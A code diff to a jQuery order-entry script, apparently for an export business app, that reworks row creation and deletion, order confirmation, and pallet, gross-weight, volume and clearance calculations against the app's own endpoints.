@@ -1,6 +1,11 @@
 var fullUrl = window.location.origin;
 var FULLURL="order";
+var isEdit=$("#isEdit").val();
 
+function setcal(isCallables) {
+    //console.log("setcal:" + isCallables);
+    $("#isCallables").val(isCallables);
+}
 var cnts=0;;
 function changC(cntss)
 {
@@ -8,7 +13,11 @@ function changC(cntss)
 }
 
 
+
+
 $('form').submit(function(){
+
+    
     $(this).children('button[type=submit]').prop('disabled', true);
 });
 
@@ -32,11 +41,13 @@ $('.confirm').on('click',function(){
               }).then((result) => {
                 if (result.value) {
                     $.ajax({
-                        url:fullUrl+'/order/confirm',
+                        url:FULLURL+'/confirm',
                         method:'get',
                         data:{id:id},
                         success:function(data){
-                            if(data == true){
+                           
+
+                            if(data.status == true){
                                 Swal.fire(
                                     'Success!',
                                     'Your Order has been confirm.',
@@ -45,7 +56,7 @@ $('.confirm').on('click',function(){
                             }else{
                                 Swal.fire(
                                     'Please Check!',
-                                    'Packaged products.',
+                                    'Packaged products is '+data.percent+"% completed",
                                     'info'
                                   )
                             }
@@ -88,154 +99,288 @@ $('.freight').on('click',function(){
 
 var itf = $.ajax({url:FULLURL+'/getITF',method:'get',async:false,success:function(rs){ itf=rs }}).responseText;
 var unit = $.ajax({url:FULLURL+'/getUnit',method:'get',async:false,success:function(data){ unit=data }}).responseText;
-$(document).on('click','.add-row',function(){
+
+$(document).on('click', '.add-row', function() {
+    setcal(0)
+
     const currency = $('#currency').children("option:selected").text()
+
     var row = $('#sorted_table').find('tbody tr').last().data('id');
-   var markup = '<tr id="row' + (row + 1) + '" data-id="' + (row + 1) + '"><td data-label="ITF"><select name="itf[]" id="itf' + (row + 1) + '" class="form-control select_itf select2" style="width:100%">' + itf + '</select></td><td data-label="Quantity"><input type="number" class="form-control qty" name="quantity[]" step="0.01" min="0" placeholder="Enter quantity" onchange="myFunction(' + (row + 1) + ')" value="" id="tqty' + (row + 1) + '"><input type="hidden" class="ean_id" name="ean_id[]" placeholder="ean_id"><input type="hidden" class="ean_qty" name="ean_qty[]" placeholder="ean_qty"><input type="hidden" class="net_weight" name="net_weight[]" placeholder="net_weight"><input type="hidden" class="new_weight" name="new_weight[]" placeholder="new_weight"><input type="hidden" class="maxcbm" name="maxcbm[]" placeholder="maxcbm"><input type="hidden" class="maxpallet" name="maxpallet[]" placeholder="maxpallet"> <input type="hidden" class="net_weight2" name="net_weight2[]" placeholder="net_weight2"><input type="hidden" class="ean_ppITF" name="ean_ppITF[]" placeholder="ean_ppITF"><input type="hidden" class="itfQty" name="itfQty[]" placeholder="itfQty"><input type="hidden" class="net_weightNew" name="net_weightNew[]" placeholder="net_weightNew"><input type="hidden" class="hpl_avg_weight" name="hpl_avg_weight[]" ></td><td data-label="Unit"><select onclick="changC(1)" name="unitcount[]" id="unitcount' + (row + 1) + '" class="form-control unitcount" style="width:100%">' + unit + '</select></td><td data-label="Number of Box"><input type="text" class="form-control number_box" name="number_box[]" value="" placeholder="" readonly></td><td data-label="NW"><input type="text" class="form-control nw" name="nw[]" value="" placeholder="" readonly><input type="hidden" class="form-control gw_weight" name="gw_weight[]" placeholder="gw_weight"><input type="hidden" class="form-control cbm" name="cbm[]" placeholder="cbm"><input type="hidden" class="form-control pallet" name="pallet[]" placeholder="pallet"><input type="hidden" class="form-control price_allocation" name="price_allocation[]" placeholder="price_allocation"><input type="hidden" class="form-control price_pallet_unit" name="price_pallet_unit[]" placeholder="price_pallet_unit"><input type="hidden" class="form-control itf_pallet_price" name="itf_pallet_price[]" placeholder="itf_pallet_price"><input type="hidden" class="form-control itf_clearance_price" name="itf_clearance_price[]" placeholder="itf_clearance_price"><input type="hidden" class="form-control itf_transport_price" name="itf_transport_price[]" placeholder="itf_transport_price"><input type="hidden" class="form-control itf_cost_price" name="itf_cost_price[]" placeholder="itf_cost_price"><input type="hidden" class="form-control itf_freight_rate" name="itf_freight_rate[]" placeholder="itf_freight_rate"><input type="hidden" class="form-control total_itf_cost" name="total_itf_cost[]" placeholder="total_itf_cost">  <input type="hidden" class="form-control itf_cal_selling" name="itf_cal_selling[]" placeholder="itf_cal_selling"><input type="hidden" class="form-control itf_cost" name="itf_cost[]" placeholder="itf_cost"> <input type="hidden" class="form-control fixPrice" name="fixPrice[]" placeholder="fixPrice"><input type="hidden" class="form-control profit2" name="profit2[]" placeholder="profit2"><input type="hidden" class="form-control itf_GW" name="itf_GW[]" placeholder="itf_GW" value="0">  <input type="hidden" class="form-control itf_CBM" name="itf_CBM[]" placeholder="itf_CBM"><input type="hidden" class="form-control itf_freight" name="itf_freight[]" placeholder="itf_freight"><input type="hidden" class="form-control itf_fob" name="itf_fob[]" placeholder="itf_fob"><input type="hidden" class="form-control itf_rebate" name="itf_rebate[]" placeholder="itf_rebate"><input type="hidden" class="form-control itf_price" name="itf_price[]" placeholder="itf_price"><input type="hidden" class="form-control ean_cost" name="ean_cost[]" placeholder="ean_cost"><input type="hidden" class="form-control pack_cost" name="pack_cost[]" placeholder="pack_cost"><input type="hidden" class="form-control total_cost" name="total_cost[]" placeholder="total_cost"><input type="hidden" class="form-control itf_fx_price" name="itf_fx_price[]" placeholder="itf_fx_price"> <input type="hidden" class="form-control of_pallats" name="of_pallats[]" placeholder="of_pallats"><input type="hidden" class="form-control box_pallet" name="box_pallet[]" placeholder="box_pallet"><input type="hidden" class="form-control box_weight" name="box_weight[]" value="0" placeholder="box_weight"><input type="hidden" class="form-control total_pallat_weight" name="total_pallat_weight[]" placeholder="total pallat_weight orange"><input type="hidden" class="form-control total_weight" name="total_weight[]" placeholder="total_weight"><input type="hidden" class="form-control itotal_cost" name="itotal_cost[]" placeholder="itotal_cost"><input type="hidden" class="com_pallets" name="com_pallets[]"></td><td data-label="Unit Price"><div class="input-group"><input class="form-control unit_price" type="text" name="unit_price[]" placeholder=""><div class="input-group-append"><span class="input-group-text currency_text">' + currency + '</span></div></div></td><td data-label="Profit"><input class="form-control profit" type="text" name="profit[]" placeholder="" readonly></td><td data-label="Action"><button type="button" class="btn btn-outline-primary calculate-row" title="Calculate"><i class="fas fa-square-root-alt"></i></button> <button type="button" href="javascript:" class="btn btn-danger delete-row" data-id="'+(row+1)+'" title="Delete"><i class="far fa-trash-alt"></i></button></td></tr>';
+
+    var markup = '<tr id="row' + (row + 1) + '" data-id="' + (row + 1) + '"><td data-label="ITF"><select name="itf[]" id="itf' + (row + 1) + '" class="form-control select_itf select2" style="width:100%">' + itf + '</select></td><td data-label="Quantity"><input type="number" class="form-control qty" name="quantity[]" step="0.01" min="0" placeholder="Enter quantity" onchange="myFunction('+(row+1)+',this)" value="" id="tqty' + (row + 1) + '"><input type="hidden" class="ean_id" name="ean_id[]" placeholder="ean_id"><input type="hidden" class="ean_qty" name="ean_qty[]" placeholder="ean_qty"><input type="hidden" class="net_weight" name="net_weight[]" placeholder="net_weight"><input type="hidden" class="new_weight" name="new_weight[]" placeholder="new_weight"><input type="hidden" class="maxcbm" name="maxcbm[]" placeholder="maxcbm"><input type="hidden" class="maxpallet" name="maxpallet[]" placeholder="maxpallet"> <input type="hidden" class="net_weight2" name="net_weight2[]" placeholder="net_weight2"><input type="hidden" class="ean_ppITF" name="ean_ppITF[]" placeholder="ean_ppITF"><input type="hidden" class="itfQty" name="itfQty[]" placeholder="itfQty"><input type="hidden" class="net_weightNew" name="net_weightNew[]" placeholder="net_weightNew"><input type="hidden" class="hpl_avg_weight" name="hpl_avg_weight[]" ></td><td data-label="Unit"><select onclick="changC(1)" name="unitcount[]" id="unitcount' + (row + 1) + '" class="form-control unitcount" style="width:100%">' + unit + '</select></td><td data-label="Number of Box"><input type="text" class="form-control number_box" name="number_box[]" value="" placeholder="" readonly></td><td data-label="NW"><input type="text" class="form-control nw" name="nw[]" value="" placeholder="" readonly><input type="hidden" class="form-control gw_weight" name="gw_weight[]" placeholder="gw_weight"><input type="hidden" class="form-control cbm" name="cbm[]" placeholder="cbm"><input type="hidden" class="form-control pallet" name="pallet[]" placeholder="pallet"><input type="hidden" class="form-control price_allocation" name="price_allocation[]" placeholder="price_allocation"><input type="hidden" class="form-control price_pallet_unit" name="price_pallet_unit[]" placeholder="price_pallet_unit"><input type="hidden" class="form-control itf_pallet_price" name="itf_pallet_price[]" placeholder="itf_pallet_price"><input type="hidden" class="form-control itf_clearance_price" name="itf_clearance_price[]" placeholder="itf_clearance_price"><input type="hidden" class="form-control itf_transport_price" name="itf_transport_price[]" placeholder="itf_transport_price"><input type="hidden" class="form-control itf_cost_price" name="itf_cost_price[]" placeholder="itf_cost_price"><input type="hidden" class="form-control itf_freight_rate" name="itf_freight_rate[]" placeholder="itf_freight_rate"><input type="hidden" class="form-control total_itf_cost" name="total_itf_cost[]" placeholder="total_itf_cost">  <input type="hidden" class="form-control itf_cal_selling" name="itf_cal_selling[]" placeholder="itf_cal_selling"><input type="hidden" class="form-control itf_cost" name="itf_cost[]" placeholder="itf_cost"> <input type="hidden" class="form-control fixPrice" name="fixPrice[]" placeholder="fixPrice"><input type="hidden" class="form-control profit2" name="profit2[]" placeholder="profit2"><input type="hidden" class="form-control itf_GW" name="itf_GW[]" placeholder="itf_GW" value="0">  <input type="hidden" class="form-control itf_CBM" name="itf_CBM[]" placeholder="itf_CBM"><input type="hidden" class="form-control itf_freight" name="itf_freight[]" placeholder="itf_freight"><input type="hidden" class="form-control itf_fob" name="itf_fob[]" placeholder="itf_fob"><input type="hidden" class="form-control itf_rebate" name="itf_rebate[]" placeholder="itf_rebate"><input type="hidden" class="form-control itf_price" name="itf_price[]" placeholder="itf_price"><input type="hidden" class="form-control ean_cost" name="ean_cost[]" placeholder="ean_cost"><input type="hidden" class="form-control pack_cost" name="pack_cost[]" placeholder="pack_cost"><input type="hidden" class="form-control total_cost" name="total_cost[]" placeholder="total_cost"><input type="hidden" class="form-control itf_fx_price" name="itf_fx_price[]" placeholder="itf_fx_price"> <input type="hidden" class="form-control of_pallats" name="of_pallats[]" placeholder="of_pallats"><input type="hidden" class="form-control box_pallet" name="box_pallet[]" placeholder="box_pallet"><input type="hidden" class="form-control box_weight" name="box_weight[]" value="0" placeholder="box_weight"><input type="hidden" class="form-control total_pallat_weight" name="total_pallat_weight[]" placeholder="total pallat_weight orange"><input type="hidden" class="form-control total_weight" name="total_weight[]" placeholder="total_weight"><input type="hidden" class="form-control itotal_cost" name="itotal_cost[]" placeholder="itotal_cost"><input type="hidden" class="com_pallets" name="com_pallets[]"></td><td data-label="Unit Price"><div class="input-group"><input class="form-control unit_price" type="text" name="unit_price[]" placeholder=""><div class="input-group-append"><span class="input-group-text currency_text">' + currency + '</span></div></div></td><td data-label="Profit"><input class="form-control profit" type="text" name="profit[]" placeholder="" readonly></td><td data-label="Action"><a href="javascript:" class="btn btn-danger delete-row" data-id="' + (row + 1) + '" title="Delete"><i class="far fa-trash-alt"></i></a></td></tr>';
+
     $("#sorted_table").append(markup);
+
     $('.select2').select2();
+
 });
 
-$(document).on('click','.delete-row',function(){
+
+
+$(document).on('click', '.delete-row', function() {
+
+    $(".buttom_vl").text(" ");
     const timing = $(this).data('timing');
-    const itf_id = $(this).parent().parent().find('select.select_itf').val();
+
     Swal.fire({
-        title:"Delete",text:"Do you want to delete row ?",icon:"warning",showCancelButton:true,confirmButtonColor:"#DD6B55",showLoaderOnConfirm: true,
+
+        title: "Delete",
+        text: "Do you want to delete row ?",
+        icon: "warning",
+        showCancelButton: true,
+        confirmButtonColor: "#DD6B55",
+        showLoaderOnConfirm: true,
+
         preConfirm: () => {
-            if(typeof undefined == typeof timing)
+
+            if (typeof undefined == typeof timing)
+
             {
-                // reCost(itf_id);
+
                 $(this).parent().parent().remove();
-            }else{
-                // reCost(itf_id);
+
+            } else {
+
                 const id = $(this).data('id');
+
                 $.ajax({
-                    url: FULLURL+'/destroyITF',
-                    method:'get',
-                    data: {id:id},
+
+                    url: FULLURL + '/destroyITF',
+
+                    method: 'get',
+
+                    data: {
+                        id: id
+                    },
+
                 });
+
                 $(this).parent().parent().remove();
+
             }
+
             const select_palletized = $('#select_pallet').val();
+
             const select_clearance = $('#select_clearance').val();
+
             let total_box = 0;
+
             let total_nw = 0;
-            let total_gw = 0;
+
+
+
             let total_cbm = 0;
+
             let palletized = 0;
-            $.each($('input.number_box'),function(){
+
+            $.each($('input.number_box'), function() {
+
                 const box = parseFloat($(this).val());
+
                 total_box += box;
+
             })
+
             $('#span_box').html(total_box);
+
             $('#total_box').val(total_box);
 
-            $.each($('input.nw'),function(){
+
+
+            $.each($('input.nw'), function() {
+
                 const nw = parseFloat($(this).val());
+
                 total_nw += nw;
+
             })
+
             $('#span_nw').html(total_nw);
+
             $('#total_nw').val(total_nw);
-            if(select_palletized == 'yes'){
-                $('#hid_palletizad').attr('style','display:inline');
-            if($('#total_box').val() != ''){
-                    $.each($('input.pallet'),function(){
+
+            if (select_palletized == 'yes') {
+
+                $('#hid_palletizad').attr('style', 'display:inline');
+
+                if ($('#total_box').val() != '') {
+
+                    $.each($('input.pallet'), function() {
+
                         const pallet = parseFloat($(this).val());
+
                         palletized += pallet;
-                        const one = pallet/palletized;
+
+                        const one = pallet / palletized;
+
                         $('#palletized').val(Math.ceil(palletized));
+
                         $('#span_palletized').html(Math.ceil(palletized));
+
                         const total_pallet = parseFloat($('#palletized').val());
+
                         const price_pallet = parseFloat($('#price_pallet').val());
-                        const two = total_pallet*price_pallet;
-                        const price_allocation = parseFloat(one)*parseFloat(two);
+
+                        const two = total_pallet * price_pallet;
+
+                        const price_allocation = parseFloat(one) * parseFloat(two);
+
                         $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(Math.ceil(price_allocation));
+
                         const qty = $(this).parent().parent().find('td:nth-child(2) input.qty').val();
+
                         const allocation = $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val();
-                        const price_pallet_unit = parseFloat(allocation)/parseFloat(qty);
+
+                        const price_pallet_unit = parseFloat(allocation) / parseFloat(qty);
+
                         $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(price_pallet_unit.toFixed(4));
-            
-                        const palletized_price = (price_pallet*total_pallet*qty)/palletized;
+
+
+
+                        const palletized_price = (price_pallet * total_pallet) / palletized;
+
                         $('#palletized_price').val(palletized_price.toFixed(4));
-                    })
-            
-                    $.each($('input.gw_weight'),function(){
-                        const pallet_weight = (parseFloat($('#weight_pallet').val())*parseFloat($('#palletized').val()))/parseFloat(palletized);
-                        const gw = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
-                        const gw_weight = parseFloat(gw)+(parseFloat($(this).parent().find('input.pallet').val())*parseFloat(pallet_weight))
-                        $(this).val(gw_weight.toFixed(2));
-                    })
-            
-                    $.each($('input.itf_pallet_price'),function(){
-                        const palletized_price = parseFloat($('#palletized_price').val());
-                        const pallet = parseFloat($(this).parent().find('input.pallet').val());
-                        const itf_pallet_price = pallet*palletized_price*1.5;
-                        $(this).val(itf_pallet_price.toFixed(4));
-                    })
-            
-                    $.each($('input.gw_weight'),function(){
-                        const gw_weight = parseFloat($(this).val());
-                        total_gw += gw_weight;
-                    })
-                    // const weight_pallet = parseFloat($('#weight_pallet').val());
-                    // const cal_gw = parseFloat(total_gw)+(parseFloat($('#palletized').val())*parseFloat(weight_pallet));
-                    $('#span_gw').html(total_gw.toFixed(2));
-                    $('#total_gw').val(total_gw.toFixed(2));
-                    
-                    $.each($('input.cbm'),function(){
-                        const cbm = parseFloat($(this).val());
-                        total_cbm += cbm;
-                    })
-                    const cbm_pallet = parseFloat($('#cbm_pallet').val());
-                    const cal_cbm = parseFloat(total_cbm)+(parseFloat($('#palletized').val())*parseFloat(cbm_pallet));
-                    $('#span_cbm').html(cal_cbm.toFixed(2));
-                    $('#total_cbm').val(cal_cbm.toFixed(2));
-                }
-            }else{
-                $('#hid_palletizad').attr('style','display:none');
-                if($('#total_box').val() != ''){
-                    $.each($('input.gw_weight'),function(){
-                    const gw_weight = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
-                    $(this).parent().parent().find('td:nth-child(5) input.gw_weight').val(gw_weight.toFixed(2));
-                    })
-                    
-                    $.each($('input.maxpallet'),function(){
-                        $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(palletized+1.6);
-                        $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(palletized);
-                        $(this).parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(palletized);
+
                     })
 
-                    $.each($('input.gw_weight'),function(){
-                        const gw_weight = parseFloat($(this).val());
-                        total_gw += gw_weight+0.5;
+
+
+                    $.each($('input.gw_weight'), function()
+
+                        {
+
+                            const pallet_weight = (parseFloat($('#weight_pallet').val()) * parseFloat($('#palletized').val())) / parseFloat(palletized);
+
+                            const gw = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val()) * parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
+
+                            const gw_weight = parseFloat(gw) + (parseFloat($(this).parent().find('input.pallet').val()) * parseFloat(pallet_weight))
+
+                            $(this).val(gw_weight.toFixed(2));
+
+
+
+                            $(this).parent().parent().find('td:nth-child(5) input.itf_GW').val(gw.toFixed(2));
+
+
+
+
+                        })
+
+
+
+                    $.each($('input.itf_pallet_price'), function() {
+
+                        const palletized_price = parseFloat($('#palletized_price').val());
+
+                        const pallet = parseFloat($(this).parent().find('input.pallet').val());
+
+                        const itf_pallet_price = pallet * palletized_price;
+
+                        $(this).val(itf_pallet_price.toFixed(4));
+
                     })
+
+
+                    total_gw = 0;
+                    $.each($('input.gw_weight'), function() {
+
+                        const gw_weight = parseFloat($(this).val());
+
+                        total_gw += gw_weight;
+
+                    })
+
+
+
+                    $('#span_gw').html(total_gw.toFixed(2));
+
+                    $('#total_gw').val(total_gw.toFixed(2));
+                    getFreights(total_gw.toFixed(2));
+
+
+
+                    $.each($('input.cbm'), function() {
+
+                        const cbm = parseFloat($(this).val());
+
+                        total_cbm += cbm;
+
+                    })
+
+                    const cbm_pallet = parseFloat($('#cbm_pallet').val());
+
+                    const cal_cbm = parseFloat(total_cbm) + (parseFloat($('#palletized').val()) * parseFloat(cbm_pallet));
+
+                    $('#span_cbm').html(cal_cbm.toFixed(2));
+
+                    $('#total_cbm').val(cal_cbm.toFixed(2));
+
+                }
+
+            } else {
+
+                $('#hid_palletizad').attr('style', 'display:none');
+
+                if ($('#total_box').val() != '') {
+
+                    $.each($('input.gw_weight'), function() {
+
+                        const gw_weight = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val()) * parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
+
+                        $(this).parent().parent().find('td:nth-child(5) input.gw_weight').val(gw_weight.toFixed(2));
+
+                    })
+
+
+
+                    $.each($('input.maxpallet'), function() {
+
+                        $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(palletized);
+
+                        $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(palletized);
+
+                        $(this).parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(palletized);
+
+                    })
+
+
+                    total_gw = 0;
+                    $.each($('input.gw_weight'), function() {
+
+                        const gw_weight = parseFloat($(this).val());
+
+                        total_gw += gw_weight;
+
+                    })
+
                     $('#span_gw').html(total_gw);
+
                     $('#total_gw').val(total_gw);
 
-                    $.each($('input.cbm'),function(){
+
+
+                    $.each($('input.cbm'), function() {
+
                         const cbm = parseFloat($(this).val());
+
                         total_cbm += cbm;
+
                     })
+
                     $('#span_cbm').html(total_cbm.toFixed(2));
+
                     $('#total_cbm').val(total_cbm.toFixed(2));
+
                 }
+
             }
+
         }
+
     });
+
 });
 
-// $(document).on('click','.btn_recost',function(){
-//     const time = $('#sorted_table tbody tr').length*1000
-//     loading(time);
-//     $(this).attr('style','display: none');
-//     $('.qty,.unitcount,.unit_price').attr('readonly','readonly');
-//     $('.btn-success,.calculate-row,.update-row').attr('disabled','disabled');
-//     $(this).parent().find('.update,.cancel').removeAttr('style');
-//     $.each($('.select_itf'),function(){
-//         const itf_id = $(this).val();
-//         reCost(itf_id);
-//     })
-// })
 
 $(document).on('change','#client',function(){
     var $this = $(this);
@@ -274,14 +419,14 @@ $(document).on('change','#airport',function(){
     const id = $this.val();
     if($this.val() != "")
     {
-        $('#shipto').attr('disabled',true);
+        $('#shipto').attr('readonly',true);
         $.get(FULLURL+'/getAir?airport_id='+id)
         .done(function(data){
             $('#airline').empty();
             $('#airline').append(data.airline);
         })
     }else{
-        $('#shipto').attr('disabled',false);
+        $('#shipto').attr('readonly',false);
         $.get(FULLURL+'/getAir?airport_id='+id)
         .done(function(data){
             $('#airline').empty();
@@ -299,125 +444,259 @@ $(document).on('change','#currency',function(){
     $('.currency_text').text($(this).children("option:selected").text());
 })
 
-$(document).on('change','#select_pallet',function(){
+$(document).on('change', '#select_pallet', function() {
+
     var $this = $(this);
+
     const val = $this.val();
+
     let total_box = 0;
+
     let total_nw = 0;
+
     let total_gw = 0;
+
     let total_cbm = 0;
+
     let palletized = 0;
-    if(val == 'yes'){
-        $('#hid_palletizad').attr('style','display:inline');
-        if($('#total_box').val() != ''){
-            $.each($('input.pallet'),function(){
+
+    if (val == 'yes')
+
+    {
+
+        $('#hid_palletizad').attr('style', 'display:inline');
+
+        if ($('#total_box').val() != '') {
+
+            $.each($('input.pallet'), function() {
+
                 const pallet = parseFloat($(this).val());
+
                 palletized += pallet;
-                const one = pallet/palletized;
+
+                const one = pallet / palletized;
+
                 $('#palletized').val(Math.ceil(palletized));
+
                 $('#span_palletized').html(Math.ceil(palletized));
+
                 const total_pallet = parseFloat($('#palletized').val());
+
                 const price_pallet = parseFloat($('#price_pallet').val());
-                const two = total_pallet*price_pallet;
-                const price_allocation = parseFloat(one)*parseFloat(two);
+
+                const two = total_pallet * price_pallet;
+
+                const price_allocation = parseFloat(one) * parseFloat(two);
+
                 $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(Math.ceil(price_allocation));
+
                 const qty = $(this).parent().parent().find('td:nth-child(2) input.qty').val();
+
                 const allocation = $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val();
-                const price_pallet_unit = parseFloat(allocation)/parseFloat(qty);
+
+                const price_pallet_unit = parseFloat(allocation) / parseFloat(qty);
+
                 $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(price_pallet_unit.toFixed(4));
-    
-                const palletized_price = (price_pallet*total_pallet)/palletized;
+
+
+
+                const palletized_price = (price_pallet * total_pallet) / palletized;
+
                 $('#palletized_price').val(palletized_price.toFixed(4));
-            })
-    
-            $.each($('input.gw_weight'),function(){
-                const pallet_weight = (parseFloat($('#weight_pallet').val())*parseFloat($('#palletized').val()))/parseFloat(palletized);
-                const gw = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
-                const gw_weight = parseFloat(gw)+(parseFloat($(this).parent().find('input.pallet').val())*parseFloat(pallet_weight))
-                $(this).val(gw_weight.toFixed(2));
-            })
-    
-            $.each($('input.itf_pallet_price'),function(){
-                const palletized_price = parseFloat($('#palletized_price').val());
-                const pallet = parseFloat($(this).parent().find('input.pallet').val());
-                const itf_pallet_price = pallet*palletized_price;
-                $(this).val(itf_pallet_price.toFixed(4));
-            })
-    
-            $.each($('input.gw_weight'),function(){
-                const gw_weight = parseFloat($(this).val());
-                total_gw += gw_weight;
-            })
-            // const weight_pallet = parseFloat($('#weight_pallet').val());
-            // const cal_gw = parseFloat(total_gw)+(parseFloat($('#palletized').val())*parseFloat(weight_pallet));
-            $('#span_gw').html(total_gw.toFixed(2));
-            $('#total_gw').val(total_gw.toFixed(2));
-            
-            $.each($('input.cbm'),function(){
-                const cbm = parseFloat($(this).val());
-                total_cbm += cbm;
-            })
-            const cbm_pallet = parseFloat($('#cbm_pallet').val());
-            const cal_cbm = parseFloat(total_cbm)+(parseFloat($('#palletized').val())*parseFloat(cbm_pallet));
-            $('#span_cbm').html(cal_cbm.toFixed(2));
-            $('#total_cbm').val(cal_cbm.toFixed(2));
-        }
-    }else{
-        $('#hid_palletizad').attr('style','display:none');
-        if($('#total_box').val() != ''){
-            $.each($('input.gw_weight'),function(){
-            const gw_weight = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val())*parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
-            $(this).parent().parent().find('td:nth-child(5) input.gw_weight').val(gw_weight.toFixed(2));
-            })
-            
-            $.each($('input.maxpallet'),function(){
-                $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(palletized);
-                $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(palletized);
-                $(this).parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(palletized);
+
             })
 
-            $.each($('input.gw_weight'),function(){
-                const gw_weight = parseFloat($(this).val());
-                total_gw += gw_weight;
+
+
+            $.each($('input.gw_weight'), function() {
+
+                const pallet_weight = (parseFloat($('#weight_pallet').val()) * parseFloat($('#palletized').val())) / parseFloat(palletized);
+
+                const gw = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val()) * parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
+
+                const gw_weight = parseFloat(gw) + (parseFloat($(this).parent().find('input.pallet').val()) * parseFloat(pallet_weight))
+
+                $(this).val(gw_weight.toFixed(2));
+
             })
+
+
+
+            $.each($('input.itf_pallet_price'), function()
+
+                {
+
+                    const palletized_price = parseFloat($('#palletized_price').val());
+
+                    const pallet = parseFloat($(this).parent().find('input.pallet').val());
+
+                    const itf_pallet_price = pallet * palletized_price;
+
+                    $(this).val(itf_pallet_price.toFixed(4));
+
+                })
+
+            total_gw = 0;
+
+            $.each($('input.gw_weight'), function() {
+
+                const gw_weight = parseFloat($(this).val());
+
+                total_gw += gw_weight;
+
+            })
+
+
+
+            $('#span_gw').html(total_gw.toFixed(3));
+
+            $('#total_gw').val(total_gw.toFixed(3));
+
+
+
+            $.each($('input.cbm'), function() {
+
+                const cbm = parseFloat($(this).val());
+
+                total_cbm += cbm;
+
+            })
+
+            const cbm_pallet = parseFloat($('#cbm_pallet').val());
+
+            const cal_cbm = parseFloat(total_cbm) + (parseFloat($('#palletized').val()) * parseFloat(cbm_pallet));
+
+            $('#span_cbm').html(cal_cbm.toFixed(3));
+
+            $('#total_cbm').val(cal_cbm.toFixed(3));
+
+        }
+
+    } else {
+
+        $('#hid_palletizad').attr('style', 'display:none');
+
+        if ($('#total_box').val() != '') {
+
+            $.each($('input.gw_weight'), function() {
+
+                const gw_weight = parseFloat($(this).parent().parent().find('td:nth-child(4) input.number_box').val()) * parseFloat($(this).parent().parent().find('td:nth-child(2) input.new_weight').val());
+
+                $(this).parent().parent().find('td:nth-child(5) input.gw_weight').val(gw_weight.toFixed(2));
+
+            })
+
+
+
+            $.each($('input.maxpallet'), function() {
+
+                $(this).parent().parent().find('td:nth-child(5) input.price_allocation').val(palletized);
+
+                $(this).parent().parent().find('td:nth-child(5) input.price_pallet_unit').val(palletized);
+
+                $(this).parent().parent().find('td:nth-child(5) input.itf_pallet_price').val(palletized);
+
+            })
+
+
+            total_gw = 0;
+            $.each($('input.gw_weight'), function() {
+
+                const gw_weight = parseFloat($(this).val());
+
+                total_gw += gw_weight;
+
+            })
+
             $('#span_gw').html(total_gw);
+
             $('#total_gw').val(total_gw);
 
-            $.each($('input.cbm'),function(){
+
+
+            $.each($('input.cbm'), function() {
+
                 const cbm = parseFloat($(this).val());
+
                 total_cbm += cbm;
+
             })
-            $('#span_cbm').html(total_cbm.toFixed(2));
-            $('#total_cbm').val(total_cbm.toFixed(2));
+
+            $('#span_cbm').html(total_cbm.toFixed(3));
+
+            $('#total_cbm').val(total_cbm.toFixed(3));
+
         }
+
     }
+
 })
 
-$(document).on('change','#select_clearance',function(){
+
+
+$(document).on('change', '#select_clearance', function() {
+
     var $this = $(this);
+
     const id = $this.val();
-    $.get(FULLURL+'/getClearance?id='+id)
-    .done(function(data){
-        $('#clearance').val(data.clearance)
-        $('#chamber').val(data.chamber)
-    })
+
+    if ($this.val() != '') {
+
+        $.get(FULLURL + '/getClearance?id=' + id)
+
+            .done(function(data) {
+
+                $('#clearance').val(data.clearance)
+
+                $('#chamber').val(data.chamber)
+
+
+
+
+                getPalatass();
+
+
+
+
+            })
+
+    }
+
 })
 
-$(document).on('change','#select_chamber',function(){
+
+
+$(document).on('change', '#select_chamber', function() {
+
     var $this = $(this);
+
     const val = $this.val();
-    if(val == 'yes'){
+
+    if (val == 'yes') {
+
         const clearance = parseFloat($('#clearance').val());
+
         const chamber = parseFloat($('#chamber').val());
-        const new_clearance = parseFloat(clearance)+parseFloat(chamber);
+
+        const new_clearance = parseFloat(clearance) + parseFloat(chamber);
+
         $('#clearance').val(new_clearance);
-    }else{
+
+    } else {
+
         const clearance = parseFloat($('#clearance').val());
+
         const chamber = parseFloat($('#chamber').val());
-        const new_clearance = parseFloat(clearance)-parseFloat(chamber);
+
+        const new_clearance = parseFloat(clearance) - parseFloat(chamber);
+
         $('#clearance').val(new_clearance);
+
     }
+
 })
+
+
 
 $(document).on('change', '.select_itf', function() {
 
@@ -555,681 +834,6 @@ $(document).on('change', '.select_itf', function() {
 })
 
 
-$(document).on('change','.qty',function(){
-    var $this = $(this);
-    const qty = $this.val();
-    const itf_id = $this.parent().parent().find('td:nth-child(1) select.select_itf').val();
-    const id = $this.parent().parent().find('td:nth-child(3) select.unitcount').val();
-    const ean_id = $this.parent().parent().find('td:nth-child(2) input.ean_id').val().split(',');
-    const count_ean_id = ean_id.length;
-    const ean_qty = $this.parent().parent().find('td:nth-child(2) input.ean_qty').val();
